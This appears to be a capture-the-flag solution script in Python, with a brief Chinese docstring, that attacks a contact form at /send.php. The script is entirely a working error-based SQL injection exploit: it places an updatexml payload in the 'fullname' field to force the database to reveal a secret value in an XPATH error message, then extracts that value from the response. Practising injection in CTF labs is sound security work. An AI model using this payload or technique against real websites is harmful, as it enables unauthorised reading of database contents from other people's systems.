import re
import requests
import sys

'''
@文件命名：X-071-24
@使用方式: python X-071-24.py url
@简述思路: 报错注入通过 updatexml 回显，将 flag 拼入错误信息中提取。
'''


def Scan(url):
    data = {
        'fullname': "x' ORDER BY updatexml(1,concat(0x7e,(select flag from flag limit 1),0x7e),1) -- -",
        'email': 'a@a.com',
        'phone': '123',
        'subject': 'test',
        'message': 'hi',
        'submit': ''
    }
    r = requests.post(url + '/send.php', data=data, timeout=10)
    m = re.search(r"XPATH syntax error: '([^']+)'", r.text)
    return m.group(1).strip('~')


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
